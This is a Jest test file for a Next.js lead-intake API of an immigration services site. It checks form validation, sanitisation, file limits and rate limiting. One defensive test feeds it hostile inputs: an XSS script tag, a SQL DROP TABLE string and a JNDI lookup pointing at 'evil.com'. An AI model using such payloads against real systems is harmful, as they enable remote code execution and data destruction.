import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { POST } from "@/app/api/leads/route";

// Mock next/server before importing
jest.mock("next/server", () => ({
  NextRequest: class {
    url: string;
    method: string;
    _body: any;
    _headers: Map<string, string>;

    constructor(url: string, options: any = {}) {
      this.url = url;
      this.method = options.method || "GET";
      this._body = options.body;
      this._headers = new Map();

      // Set headers from options
      if (options.headers) {
        if (options.headers instanceof Map) {
          this._headers = new Map(options.headers);
        } else if (typeof options.headers === "object") {
          Object.entries(options.headers).forEach(([key, value]) => {
            this._headers.set(key.toLowerCase(), value as string);
          });
        }
      }
    }

    async formData() {
      if (this._body instanceof FormData) {
        return this._body;
      }
      throw new Error("Request body is not FormData");
    }

    get headers() {
      return {
        get: (name: string) => this._headers.get(name.toLowerCase()) || null,
      };
    }
  } as any,
  NextResponse: {
    json: (data: any, options: any = {}) => ({
      status: options.status || 200,
      json: async () => data,
      headers: {
        get: (name: string) => options.headers?.[name] || null,
        ...options.headers,
      },
    }),
  },
}));

const { NextRequest } = require("next/server");

// Mock the database
jest.mock("@/lib/db", () => ({
  prisma: {
    lead: {
      create: jest.fn(),
    },
  },
}));

describe("Form Submission Integration Tests", () => {
  let mockCreate: jest.Mock;
  let testCounter = 0;

  beforeEach(() => {
    // Reset the database mock
    const { prisma } = require("@/lib/db");
    mockCreate = prisma.lead.create as jest.Mock;
    mockCreate.mockClear();

    // Increment counter for unique IPs
    testCounter++;
  });

  const createFormData = (data: Record<string, any>) => {
    const formData = new FormData();
    Object.entries(data).forEach(([key, value]) => {
      if (Array.isArray(value)) {
        value.forEach((item) => formData.append(key, item));
      } else if (value !== undefined && value !== null) {
        formData.append(key, value);
      }
    });
    return formData;
  };

  const createRequest = (formData: FormData, headers: Record<string, string> = {}) => {
    // Use unique IP for each test to avoid rate limiting
    const uniqueIp = `192.168.1.${testCounter}`;
    return new NextRequest("http://localhost:3000/api/leads", {
      method: "POST",
      body: formData,
      headers: {
        "x-forwarded-for": uniqueIp,
        ...headers,
      },
    });
  };

  describe("End-to-End Form Validation and Submission", () => {
    it("should successfully process a complete valid submission", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 1 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const validFormData = {
        firstName: "John",
        lastName: "Doe",
        email: "john.doe@example.com",
        country: "United States",
        website: "https://johndoe.com",
        reason:
          "I am seeking immigration assistance for my O-1 visa application and would like to understand my options.",
        categories: ["O-1", "EB-1A"],
      };

      const formData = createFormData(validFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
      expect(result.message).toBe("Lead submitted successfully");
      expect(result.id).toBe(1);

      // Verify database call with sanitized data
      expect(prisma.lead.create).toHaveBeenCalledWith({
        data: {
          firstName: "John",
          lastName: "Doe",
          email: "john.doe@example.com",
          country: "United States",
          website: "https://johndoe.com",
          reason:
            "I am seeking immigration assistance for my O-1 visa application and would like to understand my options.",
          categories: ["O-1", "EB-1A"],
          resume: null,
        },
      });
    });

    it("should handle edge case: minimal valid submission", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 2 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const minimalFormData = {
        firstName: "Jo",
        lastName: "Do",
        email: "j@d.co",
        country: "US",
        reason: "Immigration help needed for my case.",
        categories: ["I don't know"],
      };

      const formData = createFormData(minimalFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
    });

    it("should handle edge case: maximum length fields", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 3 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const maxLengthFormData = {
        firstName: "A".repeat(50), // Max 50 chars
        lastName: "B".repeat(50), // Max 50 chars
        email: "a".repeat(90) + "@test.com", // Max 100 chars
        country: "C".repeat(100), // Max 100 chars
        website: "https://" + "d".repeat(185) + ".com", // Max 200 chars
        reason: "E".repeat(1000), // Max 1000 chars
        categories: ["O-1", "EB-1A", "EB-2 NIW"], // Multiple categories
      };

      const formData = createFormData(maxLengthFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
    });
  });

  describe("Boundary Testing", () => {
    it("should reject fields that exceed maximum length", async () => {
      const oversizedFormData = {
        firstName: "A".repeat(51), // Over 50 chars
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need help",
        categories: ["O-1"],
      };

      const formData = createFormData(oversizedFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(400);
      expect(result.error).toBe("Validation failed");
      expect(result.details).toContain("First name must be between 2 and 50 characters");
    });

    it("should reject fields that are too short", async () => {
      const undersizedFormData = {
        firstName: "A", // Under 2 chars
        lastName: "B", // Under 2 chars
        email: "j@d", // Under 5 chars
        country: "U", // Under 2 chars
        reason: "Short", // Under 10 chars
        categories: ["O-1"],
      };

      const formData = createFormData(undersizedFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(400);
      expect(result.error).toBe("Validation failed");
      expect(result.details).toContain("First name must be between 2 and 50 characters");
      expect(result.details).toContain("Last name must be between 2 and 50 characters");
      expect(result.details).toContain("Email must be between 5 and 100 characters");
      expect(result.details).toContain("Country must be between 2 and 100 characters");
      expect(result.details).toContain("Reason must be between 10 and 1000 characters");
    });
  });

  describe("Input Sanitization Testing", () => {
    it("should sanitize whitespace and normalize email case", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 4 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const formDataWithWhitespace = {
        firstName: "  John  ",
        lastName: "  Doe  ",
        email: "  JOHN.DOE@EXAMPLE.COM  ",
        country: "  United States  ",
        website: "  https://johndoe.com  ",
        reason: "  I need immigration help  ",
        categories: ["O-1"],
      };

      const formData = createFormData(formDataWithWhitespace);
      const request = createRequest(formData);
      const response = await POST(request);

      expect(response.status).toBe(200);
      expect(prisma.lead.create).toHaveBeenCalledWith({
        data: {
          firstName: "John",
          lastName: "Doe",
          email: "john.doe@example.com",
          country: "United States",
          website: "https://johndoe.com",
          reason: "I need immigration help",
          categories: ["O-1"],
          resume: null,
        },
      });
    });

    it("should handle special characters in names", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 5 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const formDataWithSpecialChars = {
        firstName: "María José",
        lastName: "O'Connor-Smith",
        email: "maria@example.com",
        country: "Spain",
        reason: "Need immigration assistance for my application.",
        categories: ["EB-2 NIW"],
      };

      const formData = createFormData(formDataWithSpecialChars);
      const request = createRequest(formData);
      const response = await POST(request);

      expect(response.status).toBe(200);
      expect(prisma.lead.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          firstName: "María José",
          lastName: "O'Connor-Smith",
        }),
      });
    });
  });

  describe("File Upload Boundary Testing", () => {
    it("should accept file at maximum size limit", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 6 };
      prisma.lead.create.mockResolvedValue(mockLead);

      // Create a file exactly at 5MB limit
      const maxSizeContent = new Uint8Array(5 * 1024 * 1024);
      const file = new File([maxSizeContent], "resume.pdf", {
        type: "application/pdf",
      });

      const formData = createFormData({
        firstName: "John",
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need immigration help",
        categories: ["O-1"],
        resume: file,
      });

      const request = createRequest(formData);
      const response = await POST(request);

      expect(response.status).toBe(200);
    });

    it("should reject file just over size limit", async () => {
      // Create a file just over 5MB limit
      const oversizeContent = new Uint8Array(5 * 1024 * 1024 + 1);
      const file = new File([oversizeContent], "resume.pdf", {
        type: "application/pdf",
      });

      const formData = createFormData({
        firstName: "John",
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need immigration help",
        categories: ["O-1"],
        resume: file,
      });

      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(400);
      expect(result.error).toBe("File size must be less than 5MB");
    });

    it("should accept all valid file types", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 7 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const validFileTypes = [
        { type: "application/pdf", name: "resume.pdf", content: "%PDF" },
        {
          type: "application/msword",
          name: "resume.doc",
          content: "DOC content",
        },
        {
          type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
          name: "resume.docx",
          content: "DOCX content",
        },
        {
          type: "text/plain",
          name: "resume.txt",
          content: "Plain text resume",
        },
      ];

      for (const fileType of validFileTypes) {
        jest.clearAllMocks();

        const file = new File([fileType.content], fileType.name, {
          type: fileType.type,
        });
        const formData = createFormData({
          firstName: "John",
          lastName: "Doe",
          email: "john@example.com",
          country: "USA",
          reason: "Need immigration help",
          categories: ["O-1"],
          resume: file,
        });

        const request = createRequest(formData);
        const response = await POST(request);

        expect(response.status).toBe(200);
      }
    });
  });

  describe("Rate Limiting Integration", () => {
    it("should handle rate limiting across multiple requests", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 8 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const formData = createFormData({
        firstName: "John",
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need immigration help",
        categories: ["O-1"],
      });

      const testIP = "192.168.1.100";

      // Make 5 requests (should all succeed)
      for (let i = 0; i < 5; i++) {
        const request = createRequest(formData, { "x-forwarded-for": testIP });
        const response = await POST(request);
        expect(response.status).toBe(200);
      }

      // 6th request should be rate limited
      const request = createRequest(formData, { "x-forwarded-for": testIP });
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(429);
      expect(result.error).toBe("Too many requests. Please try again later.");
      expect(response.headers.get("Retry-After")).toBeTruthy();
    });
  });

  describe("Error Recovery Testing", () => {
    it("should handle database errors gracefully", async () => {
      const { prisma } = require("@/lib/db");
      prisma.lead.create.mockRejectedValue(new Error("Database connection failed"));

      const formData = createFormData({
        firstName: "John",
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need immigration help",
        categories: ["O-1"],
      });

      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(500);
      expect(result.error).toBe(
        "An error occurred while processing your request. Please try again."
      );
    });

    it("should handle concurrent submissions with proper error handling", async () => {
      const { prisma } = require("@/lib/db");
      let callCount = 0;

      prisma.lead.create.mockImplementation(() => {
        callCount++;
        if (callCount === 1) {
          return Promise.resolve({ id: 1 });
        } else if (callCount === 2) {
          return Promise.reject(new Error("Concurrent access error"));
        } else {
          return Promise.resolve({ id: 2 });
        }
      });

      const formData = createFormData({
        firstName: "John",
        lastName: "Doe",
        email: "john@example.com",
        country: "USA",
        reason: "Need immigration help",
        categories: ["O-1"],
      });

      // First request succeeds
      const request1 = createRequest(formData, {
        "x-forwarded-for": "192.168.1.1",
      });
      const response1 = await POST(request1);
      expect(response1.status).toBe(200);

      // Second request fails
      const request2 = createRequest(formData, {
        "x-forwarded-for": "192.168.1.2",
      });
      const response2 = await POST(request2);
      expect(response2.status).toBe(500);

      // Third request succeeds
      const request3 = createRequest(formData, {
        "x-forwarded-for": "192.168.1.3",
      });
      const response3 = await POST(request3);
      expect(response3.status).toBe(200);
    });
  });

  describe("Security Edge Cases", () => {
    it("should reject malicious input patterns", async () => {
      const maliciousFormData = {
        firstName: '<script>alert("xss")</script>',
        lastName: "DROP TABLE leads;--",
        email: "test@example.com",
        country: "${jndi:ldap://evil.com/a}",
        reason: "Need help with immigration",
        categories: ["O-1"],
      };

      const formData = createFormData(maliciousFormData);
      const request = createRequest(formData);
      const response = await POST(request);
      const result = await response.json();

      expect(response.status).toBe(400);
      expect(result.error).toBe("Validation failed");
      expect(result.details).toContain("First name contains invalid characters");
      expect(result.details).toContain("Last name contains invalid characters");
    });

    it("should handle unicode and international characters properly", async () => {
      const { prisma } = require("@/lib/db");
      const mockLead = { id: 9 };
      prisma.lead.create.mockResolvedValue(mockLead);

      const internationalFormData = {
        firstName: "张三",
        lastName: "Müller",
        email: "user@example.com",
        country: "中国",
        reason: "I need assistance with my EB-2 NIW application process.",
        categories: ["EB-2 NIW"],
      };

      const formData = createFormData(internationalFormData);
      const request = createRequest(formData);
      const response = await POST(request);

      // Should fail validation due to character restrictions
      expect(response.status).toBe(400);
    });
  });
});
